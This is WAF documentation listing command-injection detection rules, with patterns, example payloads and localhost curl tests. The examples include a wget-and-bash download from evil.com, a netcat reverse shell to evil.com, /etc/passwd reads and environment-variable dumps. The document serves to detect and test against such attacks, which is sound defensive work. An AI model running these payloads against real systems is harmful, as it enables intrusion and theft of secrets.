# Command Injection Rules

The WAF applies 18 command injection rules.

**Scanned sources:** query params, request body, URL path, cookies.

---

## Shell separators and subshells (critical)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-pipe` | `\| ; \`` followed by a dangerous command | `\|cat /etc/passwd` | Pipes output of one command into another; the pipe character separates the injected command from the application's intended command |
| `cmd-subshell` | `$(...)` / `` `...` `` | `$(cat /etc/passwd)` | Shell subshell expansion — executes a command and substitutes its output |
| `cmd-path-exec` | `/bin/`, `/usr/bin/`, `/usr/local/bin/` | `/bin/bash -c id` | Absolute path to a binary — unambiguously references an executable |

```bash
curl "http://localhost:3000/?cmd=|cat+/etc/passwd"
curl "http://localhost:3000/?cmd=%24(id)"
curl "http://localhost:3000/?cmd=/bin/bash+-c+id"
```

---

## Output redirection (high)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-redirection` | `>` or `>>` to `/etc/`, `/tmp/`, `/var/`, `/dev/` | `id > /tmp/out.txt` | Redirects command output to a filesystem path — can write web shells or overwrite system files |

---

## Windows-specific (critical/high)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-win-shell` | `cmd.exe`, `powershell`, `powershell.exe`, `wscript`, `cscript` | `cmd.exe /c whoami` | Launches Windows command interpreters |
| `cmd-win-net` | `net user/group/localgroup/share` | `net user administrator newpassword` | Windows `net` command manages users, groups, and shares |
| `cmd-win-reg` | `reg add/delete/query/export` | `reg query HKLM\Software\...` | Reads or modifies Windows registry keys |

```bash
curl "http://localhost:3000/?cmd=powershell.exe+-Command+whoami"
curl "http://localhost:3000/?cmd=cmd.exe+/c+dir+C:\\"
```

---

## Network download tools (critical)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-wget-curl` | `wget https?://` / `curl https?://` | `wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s` | Downloads and potentially executes a remote payload |

```bash
curl "http://localhost:3000/?cmd=wget+http://evil.com/shell.sh"
```

---

## Code evaluation (critical/high)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-eval` | `eval(` | `eval(base64_decode('...'))` | Evaluates arbitrary code in shell, PHP, Python, JS, etc. |
| `cmd-base64-decode` | `base64 --decode` / `base64 -d` | `echo cGhwIC1y... \| base64 -d \| bash` | Decodes and executes a base64-encoded payload to bypass string detection |

---

## Language interpreter one-liners (critical — v2 rules)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-python-exec` | `python -c` / `python3 -c` with `import` or `exec` | `python3 -c 'import os; os.system("id")'` | Python single-line code execution |
| `cmd-ruby-exec` | `ruby -e '...'` | `ruby -e 'exec("whoami")'` | Ruby single-line code execution |
| `cmd-perl-exec` | `perl -e '...'` | `perl -e 'system("id")'` | Perl single-line code execution |
| `cmd-php-exec` | `php -r '...'` | `php -r 'system("id");'` | PHP CLI single-line code execution |
| `cmd-node-exec` | `node -e '...'` | `node -e 'require("child_process").exec("id",console.log)'` | Node.js single-line code execution |

```bash
curl "http://localhost:3000/?cmd=python3+-c+'import+os;os.system(\"id\")'"
curl "http://localhost:3000/?cmd=perl+-e+'system(\"whoami\")'"
```

---

## Network tools (critical — v2 rules)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-netcat` | `nc -e/n/l/v/z` / `netcat` | `nc -e /bin/bash evil.com 4444` | Netcat in reverse-shell mode sends a shell to a remote listener |

```bash
curl "http://localhost:3000/?cmd=nc+-e+/bin/bash+evil.com+4444"
```

---

## System enumeration (high — v2 rules)

| Rule ID | Pattern | Example payload | Why dangerous |
|---------|---------|-----------------|---------------|
| `cmd-whoami` | `whoami` / `id` / `passwd` | `; whoami` | Reveals the process owner — first step in privilege escalation |
| `cmd-env-dump` | `printenv` / `env` / `set` / `export` (end of input) | `; printenv` | Dumps all environment variables including secrets, tokens, and passwords |

```bash
curl "http://localhost:3000/?cmd=;+whoami"
curl "http://localhost:3000/?cmd=;+printenv"
```
